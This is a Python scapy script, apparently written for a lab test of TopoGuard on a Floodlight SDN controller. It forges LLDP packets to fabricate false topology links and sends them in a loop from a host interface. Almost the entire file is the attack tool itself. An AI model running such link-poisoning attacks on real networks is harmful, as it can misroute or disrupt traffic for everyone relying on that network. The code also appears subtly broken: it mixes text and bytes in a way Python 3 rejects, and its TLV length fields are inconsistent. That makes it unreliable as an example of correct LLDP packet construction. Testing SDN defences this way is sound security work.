#!/usr/bin/env python3
"""
Link Fabrication Attack (Topology Poisoning)
Attacker sends fake LLDP packets to create false topology links
TopoGuard should detect inconsistencies and block this
"""

from scapy.all import *
import time
import sys

def forge_lldp_packet(src_dpid, src_port, dst_mac):
    """
    Create a fake LLDP packet to poison topology
    
    Args:
        src_dpid: Source switch DPID  
        src_port: Source port number
        dst_mac: Destination MAC address
    """
    # LLDP Chassis ID TLV
    chassis_id = chr(1) + chr(7) + chr(4) + src_dpid.encode()
    
    # LLDP Port ID TLV  
    port_id = chr(2) + chr(3) + chr(2) + struct.pack('!H', src_port)
    
    # LLDP TTL TLV
    ttl = chr(3) + chr(2) + struct.pack('!H', 120)
    
    # End of LLDPDU TLV
    end = chr(0) + chr(0)
    
    # Construct LLDP payload
    lldp_payload = chassis_id + port_id + ttl + end
    
    # Create Ethernet frame with LLDP
    pkt = Ether(dst=dst_mac, src=RandMAC(), type=0x88cc) / Raw(load=lldp_payload)
    
    return pkt

def link_fabrication_attack(attacker_switch, target_switch, interface='h1-eth0', count=50):
    """
    Send fake LLDP packets to create false links in topology
    
    Args:
        attacker_switch: Fake source switch ID
        target_switch: Target switch MAC
        interface: Interface to send from
        count: Number of fake LLDP packets
    """
    print(f"[*] Starting Link Fabrication Attack (Topology Poisoning)")
    print(f"[*] Fake Switch: {attacker_switch}")
    print(f"[*] Target: {target_switch}")
    print(f"[*] TopoGuard should detect topology inconsistency...")
    
    for i in range(count):
        # Create fake LLDP packet
        fake_lldp = forge_lldp_packet(attacker_switch, i % 10, target_switch)
        
        # Send packet
        sendp(fake_lldp, iface=interface, verbose=False)
        
        if (i+1) % 10 == 0:
            print(f"[+] Sent {i+1} fake LLDP packets")
        
        time.sleep(0.2)
    
    print("[!] Attack completed")
    print("[?] Check Floodlight for TopoGuard topology verification")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 link_fabrication.py <fake_switch_id> <target_switch_mac>")
        print("Example: python3 link_fabrication.py 00:00:00:00:00:00:00:99 01:02:03:04:05:06")
        sys.exit(1)
    
    fake_sw = sys.argv[1]
    target = sys.argv[2]
    
    try:
        link_fabrication_attack(fake_sw, target)
    except PermissionError:
        print("[!] Error: This script requires root/administrator privileges")
    except Exception as e:
        print(f"[!] Error: {e}")
